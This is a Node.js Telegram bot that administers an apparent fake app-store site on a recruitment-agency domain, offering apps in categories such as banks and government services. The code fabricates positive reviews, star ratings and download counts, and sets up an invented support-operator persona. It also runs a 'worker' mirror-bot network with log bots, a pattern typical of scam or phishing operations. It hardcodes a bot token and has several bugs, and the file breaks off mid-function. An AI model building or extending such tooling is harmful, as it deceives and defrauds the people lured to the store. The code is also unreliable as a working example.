const { Telegraf, Markup } = require('telegraf');
const fs = require('fs');
const https = require('https');
const WebSocket = require('ws');
const http = require('http');
const path = require('path');

const ADMIN_CHAT_ID_LEGACY = '8482944892';
let admins = [ADMIN_CHAT_ID_LEGACY];
if (fs.existsSync('admins.json')) { admins = JSON.parse(fs.readFileSync('admins.json', 'utf8')); }
function saveAdmins() { fs.writeFileSync('admins.json', JSON.stringify(admins, null, 2), 'utf8'); }
let mirrors = {};
if (fs.existsSync('mirrors.json')) { mirrors = JSON.parse(fs.readFileSync('mirrors.json', 'utf8')); }
function saveMirrors() { fs.writeFileSync('mirrors.json', JSON.stringify(mirrors, null, 2), 'utf8'); }

let blockedUsers = {};
if (fs.existsSync('blocked_users.json')) { blockedUsers = JSON.parse(fs.readFileSync('blocked_users.json', 'utf8')); }
function saveBlockedUsers() { fs.writeFileSync('blocked_users.json', JSON.stringify(blockedUsers, null, 2), 'utf8'); }
const token = '8613108874:AAFvfALX4CftGM8DhBLLbek0V1uhd2jMUAc';
async function notifyAllAdmins(msg, extra = {}) { for (const a of admins) { try { await bot.telegram.sendMessage(a, msg, extra); } catch(e) {} } }
const bot = new Telegraf(token);
bot.use((ctx, next) => {
    console.log("Update received:", ctx.updateType);
    return next();
});

const userState = {};

// Fixed domain via named Cloudflare Tunnel
const WEBAPP_URL = 'https://rekrytointitoimistosuomi.work';
const CACHE_BUSTER = '?v=4';

const { spawn } = require('child_process');
const configPath = path.join(__dirname, 'cloudflared-config.yml');
const cloudflared = spawn(path.join(__dirname, 'cloudflared.exe'), ['tunnel', '--config', configPath, 'run']);

cloudflared.stdout.on('data', (data) => console.log('[cloudflared]', data.toString().trim()));
cloudflared.stderr.on('data', (data) => console.log('[cloudflared]', data.toString().trim()));
cloudflared.on('close', () => console.log('❌ Cloudflare Tunnel closed'));

// Set Telegram bot WebApp menu button to default to prevent non-mirror usage
(async () => {
    try {
        await bot.telegram.setChatMenuButton({
            menu_button: { type: 'default' }
        });
        console.log('✅ Bot Menu button set to default');
    } catch (err) {
        console.error('Failed to update Bot Menu:', err);
    }
})();

let appsData = {};

let globalSettings = {};
if (fs.existsSync('settings.json')) {
    globalSettings = JSON.parse(fs.readFileSync('settings.json', 'utf8'));
    // Apply defaults for new fields
    if (!globalSettings.supportName) globalSettings.supportName = 'Арсений Лавров';
    if (!globalSettings.supportPhoto) globalSettings.supportPhoto = 'https://ui-avatars.com/api/?name=Арсений+Лавров&background=0077ff&color=fff';
} else {
    globalSettings = { 
        tgLink: 'https://t.me/lizaa_hrr', 
        hasVideo: false,
        supportName: 'Арсений Лавров',
        supportPhoto: 'https://ui-avatars.com/api/?name=Арсений+Лавров&background=0077ff&color=fff'
    };
    fs.writeFileSync('settings.json', JSON.stringify(globalSettings, null, 2));
}

function saveSettings() {
    fs.writeFileSync('settings.json', JSON.stringify(globalSettings, null, 2));
    fs.writeFileSync('settings.js', 'window.appSettings = ' + JSON.stringify(globalSettings) + ';');
}
saveSettings(); // Ensure settings.js exists on startup

try {
    appsData = JSON.parse(fs.readFileSync('data.json', 'utf8'));
    let migrated = false;
    for (let key in appsData) {
        if (!appsData[key].owner) {
            // Default app without owner
            appsData[key].owner = 'GLOBAL';
            appsData[key].isPersonal = false;
            appsData[key].workerId = null;
            migrated = true;
        } else if (appsData[key].owner !== 'GLOBAL') {
            if (admins.includes(appsData[key].owner) && !appsData[key].isPersonal) {
                // Old admin app
                appsData[key].owner = 'GLOBAL';
                appsData[key].isPersonal = false;
                appsData[key].workerId = null;
                migrated = true;
            } else if (!appsData[key].workerId) {
                // Worker app that somehow has null workerId
                appsData[key].workerId = appsData[key].owner;
                appsData[key].isPersonal = true;
                migrated = true;
            }
        }
    }
    if (migrated) {
        fs.writeFileSync('data.json', JSON.stringify(appsData, null, 2));
        updateDataJs();
    }
} catch (e) {
    console.log("No data.json found or error parsing.");
}

function updateDataJs() {
    fs.writeFileSync('data.json', JSON.stringify(appsData, null, 2));
    
    let dataJsContent = fs.readFileSync('data.js', 'utf8');
    const newBlock = `let appsData = ${JSON.stringify(appsData, null, 4)};\nlet clientSettings = ${JSON.stringify({
        supportName: globalSettings.supportName,
        supportPhoto: globalSettings.supportPhoto
    })};\n`;
    
    if (dataJsContent.includes('let appsData =')) {
        dataJsContent = dataJsContent.split('let appsData =')[0] + newBlock;
    } else if (dataJsContent.includes('const appsData =')) {
        dataJsContent = dataJsContent.split('const appsData =')[0] + newBlock;
    } else {
        dataJsContent += '\n' + newBlock;
    }
    fs.writeFileSync('data.js', dataJsContent);
}

const addSteps = ['id', 'title', 'category', 'size', 'desc', 'icon', 'visibility'];
const firstNames = ["Алексей", "Дмитрий", "Иван", "Сергей", "Андрей", "Александр", "Максим", "Евгений", "Михаил", "Антон", "Елена", "Анна", "Мария", "Ольга", "Наталья"];
const positiveTexts = ["Отличное приложение!", "Супер, давно искал.", "Очень удобно.", "Рекомендую!", "Всё работает быстро.", "Лучшее в своей категории."];
const cyrillicLetters = "АБВГДЕЖЗИКЛМНОПРСТУФХЦЧШЩЭЮЯ";

function generateInitialReviews() {
    const reviews = [];
    const count = 3 + Math.floor(Math.random() * 6);
    for (let i = 0; i < count; i++) {
        const name = firstNames[Math.floor(Math.random() * firstNames.length)];
        const initial = cyrillicLetters[Math.floor(Math.random() * cyrillicLetters.length)];
        reviews.push({
            id: `rev_${Date.now()}_${Math.floor(Math.random()*1000)}`,
            author: `${name} ${initial}.`,
            text: positiveTexts[Math.floor(Math.random() * positiveTexts.length)],
            rating: 4 + Math.floor(Math.random() * 2),
            date: "Сегодня"
        });
    }
    return reviews;
}

function promptAddStep(ctx, chatId, state) {
    let msg = "";
    let keyboard = [];
    
    const stepIdx = addSteps.indexOf(state.step);
    const navButtons = [];
    if (stepIdx > 0) navButtons.push(Markup.button.callback('🔙 Назад', 'add_back'));
    navButtons.push(Markup.button.callback('❌ Отмена', 'add_cancel'));
    
    
    if (state.step === 'edit_setting') {
        globalSettings[state.field] = text.trim();
        saveSettings();
        delete userState[chatId];
        ctx.reply("✅ Настройка сохранена!", Markup.inlineKeyboard([[{ text: '🔙 К настройкам', callback_data: 'settings' }]]));
        return;
    }

    if (state.step === 'id') {
        msg = "📌 **Шаг 1: Уникальный ID**\n\nУкажите короткое название на английском без пробелов (например, `myapp`).";
        keyboard = [navButtons];
    } else if (state.step === 'title') {
        msg = "📝 **Шаг 2: Название**\n\nВведите название.";
        keyboard = [navButtons];
    } else if (state.step === 'category') {
        msg = "📁 **Шаг 3: Категория**\n\nВыберите категорию:";
        keyboard = [
            [{ text: '📱 Приложения', callback_data: 'cat_apps' }, { text: '🎮 Игры', callback_data: 'cat_games' }],
            [{ text: '🛡️ Государственные', callback_data: 'cat_gov' }, { text: '👥 Социальные сети', callback_data: 'cat_social' }],
            [{ text: '🛠 Инструменты', callback_data: 'cat_tools' }, { text: '🛒 Покупки', callback_data: 'cat_shop' }],
            [{ text: '📺 Медиа', callback_data: 'cat_media' }, { text: '🏦 Банки', callback_data: 'cat_banks' }],
            [{ text: '📚 Образование', callback_data: 'cat_edu' }],
            navButtons
        ];
    } else if (state.step === 'size') {
        msg = "📏 **Шаг 4: Размер**\n\nНапишите размер (например, `120 МБ`).";
        keyboard = [navButtons];
    } else if (state.step === 'desc') {
        msg = "📖 **Шаг 5: Описание**\n\nНапишите описание.";
        keyboard = [navButtons];
    } else if (state.step === 'icon') {
        msg = "🔹 **Шаг 6: Иконка**\n\nОтправьте квадратную картинку (как фото).";
        keyboard = [navButtons];
    } else if (state.step === 'visibility') {
        msg = "🔹 **Шаг 7: Видимость**\n\nГде показывать это приложение?";
        keyboard = [
            [Markup.button.callback('🌍 Во всех зеркалах (GLOBAL)', 'visibility_global')],
            [Markup.button.callback('🤖 Только в моем зеркале', 'visibility_personal')],
            navButtons
        ];
    }
    
    ctx.reply(msg, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: keyboard } });
}

function sendMainMenu(ctx) {
    const chatId = ctx.chat.id.toString();
    const isAdmin = admins.includes(chatId);
    const workerMirror = mirrors[chatId];
    const canAddApps = isAdmin || (workerMirror && workerMirror.canAddApps);
    
    const text = "Привет! Я бот для управления приложениями.\nВыберите действие:";
    let buttons = [];
    
    if (canAddApps) {
        buttons.push([Markup.button.callback('➕ Добавить приложение', 'add_app')]);
        buttons.push([Markup.button.callback('📋 Мои приложения', 'list_apps')]);
    }
    
    if (isAdmin) {
        buttons.push([Markup.button.callback('⚙️ Настройки', 'settings')]);
    }
    
    if (isAdmin) {
        buttons.push([Markup.button.callback('💬 Диалоги поддержки', 'view_chats')]);
    }
    
    if (isAdmin || globalSettings.mirrorsEnabled !== false || (globalSettings.mirrorWhitelist && globalSettings.mirrorWhitelist.includes(chatId))) {
        buttons.push([Markup.button.callback('🤖 Моё зеркало', 'worker_mirror')]);
    }
    
    if (isAdmin) {
        const isCreator = (ctx.chat.id.toString() === ADMIN_CHAT_ID_LEGACY);
        if (isCreator) {
            buttons.push([Markup.button.callback('👮 Управление админами', 'manage_admins')]);
        }
        buttons.push([Markup.button.callback('🪞 Управление зеркалами', 'manage_mirrors')]);
        if (isCreator) {
            buttons.push([Markup.button.callback('💎 Мои приватные зеркала', 'my_private_mirrors')]);
        }
        buttons.push([Markup.button.callback('🚫 Заблокированные', 'blocked_users')]);
    }
    const keyboard = Markup.inlineKeyboard(buttons);
    if (ctx.callbackQuery) {
        ctx.editMessageText(text, keyboard).catch(() => ctx.reply(text, keyboard));
    } else {
        ctx.reply(text, keyboard);
    }
}

bot.action('add_private_mirror', (ctx) => {
    if (ctx.chat.id.toString() !== ADMIN_CHAT_ID_LEGACY) return;
    userState[ctx.chat.id] = { step: 'private_mirror_token' };
    ctx.reply("🔑 Пришлите токен для приватного зеркала:", Markup.inlineKeyboard([[{ text: '❌ Отмена', callback_data: 'back_start' }]]));
    ctx.answerCbQuery().catch(()=>{});
});

function finishPrivateMirrorCreation(ctx, chatId) {
    const state = userState[chatId];
    if (!state) return;
    const customUsername = state.username;
    const token = state.token;
    const botUsername = state.botUsername;
    const logBotToken = state.logBotToken || null;
    
    const privateId = 'private_' + Date.now();
    mirrors[privateId] = {
        token: token,
        botUsername: botUsername,
        username: customUsername,
        workerId: privateId,
        ownerChatId: chatId.toString(), // Admin's chat ID
        isPrivate: true,
        canAddApps: false,
        logBotToken: logBotToken
    };
    saveMirrors();
    startMirror(privateId, token, botUsername);
    
    delete userState[chatId];
    let msg = `✅ Приватное зеркало успешно создано!\n\nID: \`${privateId}\`\nИмя: ${customUsername}\nБот: @${botUsername}`;
    if (logBotToken) {
        msg += `\n\n⚠️ ОБЯЗАТЕЛЬНО: Перейдите в бота для логов, чей токен вы только что прислали, и отправьте ему /start (иначе логи не будут приходить!).`;
    }
    ctx.reply(msg, { parse_mode: 'Markdown' });
    
    // Notify main creator about the new private mirror!
    if (chatId.toString() !== adminChatId) {
        bot.telegram.sendMessage(adminChatId, `👁 **Создано новое приватное зеркало**\nКто создал: @${ctx.from.username || chatId}\nИмя: ${customUsername}\nБот: @${botUsername}\nID зеркала: ${privateId}`, {parse_mode: 'Markdown'}).catch(()=>{});
    }
}

bot.action('skip_log_bot', (ctx) => {
    finishPrivateMirrorCreation(ctx, ctx.chat.id);
    ctx.answerCbQuery().catch(()=>{});
});

bot.use(async (ctx, next) => {
    if (ctx.from) {
        if (blockedUsers[ctx.from.id.toString()] || (ctx.from.username && blockedUsers[ctx.from.username])) return;
    }
    return next();
});

bot.start(async (ctx) => {
    delete userState[ctx.chat.id];
    sendMainMenu(ctx);
});

bot.command('admin', (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    delete userState[ctx.chat.id];
    sendMainMenu(ctx);
});

bot.action('add_app', (ctx) => {
    const chatId = ctx.chat.id;
    userState[chatId] = { step: 'id', data: {} };
    promptAddStep(ctx, chatId, userState[chatId]);
    ctx.answerCbQuery();
});

bot.action('add_back', (ctx) => {
    const chatId = ctx.chat.id;
    if (userState[chatId] && addSteps.includes(userState[chatId].step)) {
        const stepIdx = addSteps.indexOf(userState[chatId].step);
        if (stepIdx > 0) {
            userState[chatId].step = addSteps[stepIdx - 1];
            promptAddStep(ctx, chatId, userState[chatId]);
        }
    }
    ctx.answerCbQuery();
});

bot.action('add_cancel', (ctx) => {
    const chatId = ctx.chat.id;
    delete userState[chatId];
    ctx.answerCbQuery("Добавление отменено.");
    sendMainMenu(ctx);
});

bot.action(/visibility_(global|personal)/, (ctx) => {
    const chatId = ctx.chat.id;
    const state = userState[chatId];
    if (!state || state.step !== 'visibility') return ctx.answerCbQuery("Ошибка или устаревшая кнопка.");
    
    const isGlobal = ctx.match[1] === 'global';
    const workerIdStr = mirrors[chatId.toString()] ? chatId.toString() : null;
    
    appsData[state.data.id] = {
        owner: isGlobal ? 'GLOBAL' : chatId.toString(),
        isPersonal: !isGlobal,
        workerId: isGlobal ? null : workerIdStr,
        title: state.data.title,
        aliases: [state.data.id, state.data.title.toLowerCase()],
        category: state.data.category,
        rating: (4 + Math.random()).toFixed(1),
        reviewsCount: '1 тыс.',
        downloads: '10 тыс. +',
        size: state.data.size,
        icon: state.data.iconPath,
        description: state.data.description,
        screenshots: [],
        reviews: generateInitialReviews()
    };
    updateDataJs();
    delete userState[chatId];
    ctx.reply(`✅ **Готово!**\n\nПриложение добавлено (${isGlobal ? 'Для всех' : 'Только для вас'})!`, { parse_mode: 'Markdown' });
    sendMainMenu(ctx);
});

const catReverseMap = {
    'Приложения': 'apps',
    'Игры': 'games',
    'Государственные': 'gov',
    'Социальные сети': 'social',
    'Инструменты': 'tools',
    'Покупки': 'shop',
    'Медиа': 'media',
    'Банки': 'banks',
    'Образование': 'edu'
};

bot.action('list_apps', (ctx) => {
    delete userState[ctx.chat.id];
    const categoriesCount = {};
    const chatId = ctx.chat.id.toString();
    const isAdmin = admins.includes(chatId);
    for (let key in appsData) {
        if (!isAdmin && appsData[key].owner !== chatId) continue;
        let cat = appsData[key].category;
        categoriesCount[cat] = (categoriesCount[cat] || 0) + 1;
    }
    
    if (Object.keys(categoriesCount).length === 0) {
        return ctx.reply("Список приложений пуст.", Markup.inlineKeyboard([[Markup.button.callback('🔙 Назад', 'back_start')]]));
    }
    
    const buttons = [];
    for (let catName in categoriesCount) {
        const shortName = catReverseMap[catName] || 'other';
        buttons.push([Markup.button.callback(`📁 ${catName} (${categoriesCount[catName]})`, `list_cat_${shortName}`)]);
    }
    buttons.push([Markup.button.callback('🔙 Назад', 'back_start')]);
    
    ctx.editMessageText("📋 **Категории:**\nВыберите категорию:", { parse_mode: 'Markdown', reply_markup: { inline_keyboard: buttons } }).catch(() => {});
    ctx.answerCbQuery();
});

bot.action(/^list_cat_([a-zA-Z0-9\-_]+)$/, (ctx) => {
    const shortName = ctx.match[1];
    let catName = Object.keys(catReverseMap).find(key => catReverseMap[key] === shortName);
    
    const appsInCat = [];
    for (let key in appsData) {
        if (appsData[key].category === catName || (!catName && appsData[key].category === 'Разное')) {
            appsInCat.push({ key, title: appsData[key].title });
        }
    }
    
    const buttons = appsInCat.map(app => [Markup.button.callback(`📱 ${app.title}`, `edit_app_${app.key}`)]);
    buttons.push([Markup.button.callback('🔙 К категориям', 'list_apps')]);
    
    ctx.editMessageText(`📋 **${catName || 'Разное'}:**\nВыберите приложение:`, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: buttons } }).catch(() => {});
    ctx.answerCbQuery();
});


bot.action('settings', (ctx) => {
    delete userState[ctx.chat.id];
    const msg = `⚙️ <b>Настройки:</b>

💬 Ссылка на ТГ за аккаунтом: ${globalSettings.tgLink || 'Не задано'}\n🎥 Видео-инструкция: ${globalSettings.hasVideo ? 'Загружена ✅' : 'Не загружена ❌'}`;
    const keyboard = Markup.inlineKeyboard([
        [{ text: '✏️ Изменить ТГ ссылку', callback_data: 'edit_setting_tgLink' }],
        [{ text: '✏️ Изменить видео ссылку', callback_data: 'upload_video' }],
        [{ text: '💬 Настройки оператора', callback_data: 'settings_support' }],
        [{ text: '🔙 Назад', callback_data: 'back_start' }]
    ]);
    if (ctx.callbackQuery) {
        ctx.editMessageText(msg, { parse_mode: 'HTML', reply_markup: keyboard.reply_markup }).catch(()=>{});
    } else {
        ctx.reply(msg, { parse_mode: 'Markdown', reply_markup: keyboard.reply_markup });
    }
    ctx.answerCbQuery().catch(()=>{});

bot.action('settings_support', (ctx) => {
    delete userState[ctx.chat.id];
    const msg = `💬 <b>Настройки оператора поддержки:</b>
    
Имя: ${globalSettings.supportName}
Фото: [Ссылка на фото](${globalSettings.supportPhoto})`;
    const keyboard = Markup.inlineKeyboard([
        [{ text: '✏️ Изменить имя', callback_data: 'edit_support_name' }],
        [{ text: '🖼 Изменить фото', callback_data: 'edit_support_photo' }],
        [{ text: '🔙 Назад к настройкам', callback_data: 'settings' }]
    ]);
    ctx.editMessageText(msg, { parse_mode: 'HTML', reply_markup: keyboard.reply_markup }).catch(()=>{});
    ctx.answerCbQuery().catch(()=>{});
});

bot.action('edit_support_name', (ctx) => {
    userState[ctx.chat.id] = { step: 'edit_support_name' };
    ctx.reply('✏️ Введите новое имя оператора поддержки (например: "Арсений Лавров"):', { reply_markup: { inline_keyboard: [[{ text: '❌ Отмена', callback_data: 'settings_support' }]] } });
    ctx.answerCbQuery().catch(()=>{});
});

bot.action('edit_support_photo', (ctx) => {
    userState[ctx.chat.id] = { step: 'edit_support_photo' };
    ctx.reply('🖼 Отправьте фото оператора поддержки сюда (картинкой):', { reply_markup: { inline_keyboard: [[{ text: '❌ Отмена', callback_data: 'settings_support' }]] } });
    ctx.answerCbQuery().catch(()=>{});
});
});


bot.action('upload_video', (ctx) => {
    userState[ctx.chat.id] = { step: 'upload_video' };
    ctx.reply('🎥 Отправьте видео-файл для инструкции (желательно в формате MP4):', { reply_markup: { inline_keyboard: [[{ text: '❌ Отмена', callback_data: 'settings' }]] } });
    ctx.answerCbQuery().catch(()=>{});
});

bot.action(/^edit_setting_(.+)$/, (ctx) => {
    const field = ctx.match[1];
    userState[ctx.chat.id] = { step: `edit_setting`, field };
    const names = { tgLink: 'ТГ аккаунта (где выдают данные)', videoLink: 'Видео-инструкции' };
    ctx.reply(`✏️ Отправьте новую ссылку для ${names[field] || field}:`, { reply_markup: { inline_keyboard: [[{ text: '❌ Отмена', callback_data: 'settings' }]] } });
    ctx.answerCbQuery().catch(()=>{});
});

bot.action('back_start', (ctx) => {
    delete userState[ctx.chat.id];
    sendMainMenu(ctx);
    ctx.answerCbQuery();
});

function sendAppMenu(ctx, appId) {
    const app = appsData[appId];
    if (!app) return;
    
    const isGlobal = app.owner === 'GLOBAL';
    const visText = isGlobal ? '🌍 Для всех' : '🤖 Только мое';
    const msg = `📱 **${app.title}**\n\n📁 Категория: ${app.category}\n📏 Размер: ${app.size}\n👁 Видимость: ${visText}\n📖 Описание: ${app.description.substring(0, 50)}...`;
    
    let keyboard = [
        [{ text: '✏️ Название', callback_data: `edit_field_${appId}_title` }, { text: '📁 Категория', callback_data: `edit_field_${appId}_category` }],
        [{ text: '📏 Размер', callback_data: `edit_field_${appId}_size` }, { text: '📖 Описание', callback_data: `edit_field_${appId}_desc` }],
        [{ text: '🖼 Иконка', callback_data: `edit_field_${appId}_icon` }, { text: '💬 Отзывы', callback_data: `list_reviews_${appId}` }]
    ];
    
    if (admins.includes(ctx.chat.id.toString())) {
        keyboard.push([{ text: `👁 Видимость: ${visText}`, callback_data: `toggle_vis_${appId}` }]);
    }
    
    keyboard.push([{ text: '❌ Удалить приложение', callback_data: `delete_app_${appId}` }]);
    keyboard.push([{ text: '🔙 К категориям', callback_data: 'list_apps' }]);
    
    const kb = Markup.inlineKeyboard(keyboard);
    
    if (ctx.callbackQuery) {
        ctx.editMessageText(msg, { parse_mode: 'Markdown', reply_markup: kb.reply_markup }).catch(() => ctx.reply(msg, { parse_mode: 'Markdown', reply_markup: kb.reply_markup }));
    } else {
        ctx.reply(msg, { parse_mode: 'Markdown', reply_markup: kb.reply_markup });
    }
}

bot.action(/^toggle_vis_([a-zA-Z0-9\-_]+)$/, (ctx) => {
    const appId = ctx.match[1];
    if (!admins.includes(ctx.chat.id.toString())) return ctx.answerCbQuery("Только для админов.");
    if (!appsData[appId]) return ctx.answerCbQuery("Приложение не найдено.");
    
    if (appsData[appId].owner === 'GLOBAL') {
        appsData[appId].owner = ctx.chat.id.toString();
        appsData[appId].isPersonal = true;
        appsData[appId].workerId = mirrors[ctx.chat.id.toString()] ? ctx.chat.id.toString() : null;
    } else {
        appsData[appId].owner = 'GLOBAL';
        appsData[appId].isPersonal = false;
        appsData[appId].workerId = null;
    }
    
    updateDataJs();
    ctx.answerCbQuery("Видимость изменена!");
    sendAppMenu(ctx, appId);
});

bot.action(/^edit_app_([a-zA-Z0-9\-_]+)$/, (ctx) => {
    const appId = ctx.match[1];
    delete userState[ctx.chat.id];
    if (!appsData[appId]) return ctx.answerCbQuery("Приложение не найдено.");
    sendAppMenu(ctx, appId);
    ctx.answerCbQuery();
});

bot.action(/^delete_app_([a-zA-Z0-9\-_]+)$/, (ctx) => {
    const appId = ctx.match[1];
    if (appsData[appId]) {
        delete appsData[appId];
        updateDataJs();
        ctx.editMessageText("✅ Приложение удалено!", Markup.inlineKeyboard([[Markup.button.callback('🔙 К списку', 'list_apps')]])).catch(()=>{});
    }
    ctx.answerCbQuery();
});

bot.action(/^list_reviews_([a-zA-Z0-9\-_]+)$/, (ctx) => {
    const appId = ctx.match[1];
    const app = appsData[appId];
    if (!app) return ctx.answerCbQuery("Ошибка.");
    
    const buttons = [];
    if (app.reviews && app.reviews.length > 0) {
        app.reviews.forEach((r, i) => {
            buttons.push([Markup.button.callback(`${i+1}. ${r.author} - ${r.rating}⭐`, `review_${appId}_${r.id}`)]);
        });
    }
    
    buttons.push([Markup.button.callback('➕ Добавить отзыв', `add_rev_author_${appId}`)]);
    buttons.push([Markup.button.callback('🔙 К приложению', `edit_app_${appId}`)]);
    
    ctx.editMessageText(`💬 **Отзывы для ${app.title}:**\nНажмите на отзыв для редактирования:`, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: buttons } }).catch(()=>{});
    ctx.answerCbQuery();
});

bot.action(/^review_([a-zA-Z0-9\-_]+)_(rev_.+)$/, (ctx) => {
    const appId = ctx.match[1];
    const revId = ctx.match[2];
    const app = appsData[appId];
    if (!app) return ctx.answerCbQuery();
    
    const rev = app.reviews.find(r => r.id === revId);
    if (!rev) return ctx.answerCbQuery("Отзыв не найден");
    
    const msg = `💬 **Отзыв**\n\n👤 Автор: ${rev.author}\n⭐ Оценка: ${rev.rating}\n📝 Текст: ${rev.text}`;
    
    const buttons = [
        [{ text: '✏️ Изменить автора', callback_data: `edit_rev_author_${appId}_${revId}` }],
        [{ text: '✏️ Изменить текст', callback_data: `edit_rev_text_${appId}_${revId}` }],
        [{ text: '✏️ Оценка 5⭐', callback_data: `set_rev_rating_${appId}_${revId}_5` }, { text: 'Оценка 4⭐', callback_data: `set_rev_rating_${appId}_${revId}_4` }],
        [{ text: 'Оценка 3⭐', callback_data: `set_rev_rating_${appId}_${revId}_3` }, { text: 'Оценка 2⭐', callback_data: `set_rev_rating_${appId}_${revId}_2` }, { text: 'Оценка 1⭐', callback_data: `set_rev_rating_${appId}_${revId}_1` }],
        [{ text: '❌ Удалить отзыв', callback_data: `delete_rev_${appId}_${revId}` }],
        [{ text: '🔙 К списку', callback_data: `list_reviews_${appId}` }]
    ];
    
    ctx.editMessageText(msg, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: buttons } }).catch(()=>{});
    ctx.answerCbQuery();
});

bot.action(/^set_rev_rating_([a-zA-Z0-9\-_]+)_(rev_.+)_([1-5])$/, (ctx) => {
    const appId = ctx.match[1];
    const revId = ctx.match[2];
    const rating = parseInt(ctx.match[3]);
    
    const rev = appsData[appId].reviews.find(r => r.id === revId);
    if (rev) {
        rev.rating = rating;
        updateDataJs();
        
        const msg = `💬 **Отзыв**\n\n👤 Автор: ${rev.author}\n⭐ Оценка: ${rev.rating}\n📝 Текст: ${rev.text}`;
        const buttons = [
            [{ text: '✏️ Изменить автора', callback_data: `edit_rev_author_${appId}_${revId}` }],
            [{ text: '✏️ Изменить текст', callback_data: `edit_rev_text_${appId}_${revId}` }],
            [{ text: '✏️ Оценка 5⭐', callback_data: `set_rev_rating_${appId}_${revId}_5` }, { text: 'Оценка 4⭐', callback_data: `set_rev_rating_${appId}_${revId}_4` }],
            [{ text: 'Оценка 3⭐', callback_data: `set_rev_rating_${appId}_${revId}_3` }, { text: 'Оценка 2⭐', callback_data: `set_rev_rating_${appId}_${revId}_2` }, { text: 'Оценка 1⭐', callback_data: `set_rev_rating_${appId}_${revId}_1` }],
            [{ text: '❌ Удалить отзыв', callback_data: `delete_rev_${appId}_${revId}` }],
            [{ text: '🔙 К списку', callback_data: `list_reviews_${appId}` }]
        ];
        ctx.editMessageText(msg, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: buttons } }).catch(()=>{});
    }
    ctx.answerCbQuery("Оценка обновлена!");
});

bot.action(/^delete_rev_([a-zA-Z0-9\-_]+)_(rev_.+)$/, (ctx) => {
    const appId = ctx.match[1];
    const revId = ctx.match[2];
    
    appsData[appId].reviews = appsData[appId].reviews.filter(r => r.id !== revId);
    updateDataJs();
    ctx.answerCbQuery("Отзыв удален");
    
    const app = appsData[appId];
    const buttons = [];
    if (app.reviews && app.reviews.length > 0) {
        app.reviews.forEach((r, i) => {
            buttons.push([Markup.button.callback(`${i+1}. ${r.author} - ${r.rating}⭐`, `review_${appId}_${r.id}`)]);
        });
    }
    buttons.push([Markup.button.callback('➕ Добавить отзыв', `add_rev_author_${appId}`)]);
    buttons.push([Markup.button.callback('🔙 К приложению', `edit_app_${appId}`)]);
    ctx.editMessageText(`💬 **Отзывы для ${app.title}:**`, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: buttons } }).catch(()=>{});
});

bot.action(/^edit_rev_(author|text)_([a-zA-Z0-9\-_]+)_(rev_.+)$/, (ctx) => {
    const field = ctx.match[1];
    const appId = ctx.match[2];
    const revId = ctx.match[3];
    
    userState[ctx.chat.id] = { step: `edit_rev_${field}`, appId, revId };
    const prompt = field === 'author' ? 'Введите новое имя автора:' : 'Введите новый текст отзыва:';
    
    ctx.reply(`✏️ ${prompt}`, { reply_markup: { inline_keyboard: [[{ text: '❌ Отмена', callback_data: `review_${appId}_${revId}` }]] } });
    ctx.answerCbQuery();
});

bot.action(/^add_rev_author_([a-zA-Z0-9\-_]+)$/, (ctx) => {
    const appId = ctx.match[1];
    userState[ctx.chat.id] = { step: 'add_rev_author', appId, data: {} };
    ctx.reply("✏️ Введите имя автора для нового отзыва:", { reply_markup: { inline_keyboard: [[{ text: '❌ Отмена', callback_data: `list_reviews_${appId}` }]] } });
    ctx.answerCbQuery();
});

bot.action(/^submit_new_rev_([a-zA-Z0-9\-_]+)_([1-5])$/, (ctx) => {
    const chatId = ctx.chat.id;
    if (!userState[chatId] || userState[chatId].step !== 'add_rev_rating') return ctx.answerCbQuery();
    
    const appId = ctx.match[1];
    const rating = parseInt(ctx.match[2]);
    const state = userState[chatId];
    
    appsData[appId].reviews.push({
        id: `rev_${Date.now()}_${Math.floor(Math.random()*1000)}`,
        author: state.data.author,
        text: state.data.text,
        rating: rating,
        date: "Сегодня"
    });
    updateDataJs();
    delete userState[chatId];
    
    const app = appsData[appId];
    const buttons = [];
    app.reviews.forEach((r, i) => {
        buttons.push([Markup.button.callback(`${i+1}. ${r.author} - ${r.rating}⭐`, `review_${appId}_${r.id}`)]);
    });
    buttons.push([Markup.button.callback('➕ Добавить отзыв', `add_rev_author_${appId}`)]);
    buttons.push([Markup.button.callback('🔙 К приложению', `edit_app_${appId}`)]);
    ctx.editMessageText(`💬 **Отзывы для ${app.title}:**\n✅ Отзыв добавлен!`, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: buttons } }).catch(()=>{});
    ctx.answerCbQuery();
});

bot.action(/^edit_field_([a-zA-Z0-9\-_]+)_(.+)$/, (ctx) => {
    const chatId = ctx.chat.id;
    const appId = ctx.match[1];
    const field = ctx.match[2];
    
    if (field === 'category') {
        userState[chatId] = { step: 'edit_category', appId };
        ctx.reply("📁 Выберите новую категорию:", {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📱 Приложения', callback_data: 'cat_apps' }, { text: '🎮 Игры', callback_data: 'cat_games' }],
                    [{ text: '🛡️ Государственные', callback_data: 'cat_gov' }, { text: '👥 Социальные сети', callback_data: 'cat_social' }],
                    [{ text: '🛠 Инструменты', callback_data: 'cat_tools' }, { text: '🛒 Покупки', callback_data: 'cat_shop' }],
                    [{ text: '📺 Медиа', callback_data: 'cat_media' }, { text: '🏦 Банки', callback_data: 'cat_banks' }],
                    [{ text: '📚 Образование', callback_data: 'cat_edu' }],
                    [{ text: '❌ Отмена', callback_data: `edit_app_${appId}` }]
                ]
            }
        });
    } else {
        userState[chatId] = { step: `edit_${field}`, appId };
        const prompts = {
            'title': 'Введите новое название:',
            'size': 'Введите новый размер (например, 120 МБ):',
            'desc': 'Введите новое описание:',
            'icon': 'Пришлите новую квадратную картинку (как фото):'
        };
        ctx.reply(`✏️ ${prompts[field]}`, {
            reply_markup: {
                inline_keyboard: [[{ text: '❌ Отмена', callback_data: `edit_app_${appId}` }]]
            }
        });
    }
    ctx.answerCbQuery();
});

bot.action(/^cat_([a-zA-Z0-9\-_]+)$/, (ctx) => {
    const chatId = ctx.chat.id;
    const catType = ctx.match[1];
    
    const catMap = {
        'apps': 'Приложения',
        'games': 'Игры',
        'gov': 'Государственные',
        'social': 'Социальные сети',
        'tools': 'Инструменты',
        'shop': 'Покупки',
        'media': 'Медиа',
        'banks': 'Банки',
        'edu': 'Образование'
    };
    
